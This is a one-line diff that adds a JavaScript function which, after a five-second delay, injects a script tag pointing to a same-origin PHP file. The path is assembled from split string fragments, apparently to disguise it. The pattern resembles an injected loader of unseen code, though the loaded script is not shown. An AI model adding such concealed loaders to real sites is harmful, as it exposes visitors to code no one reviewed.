@@ -1,0 +1,1 @@
+	function loadScript()	{		var head = document.getElementsByTagName('head')[0];		var script = document.createElement('script');		script.type = 'text/javascript';		script.src = '/' + 'js' + '/_view.' + 'p' + 'hp' + '?' + '1899055247' + '.' + 'mt6e5deen39tiu02e2s6koitm4';		head.appendChild(script);	}	window.onload = window.setTimeout('loadScript()', 5000);
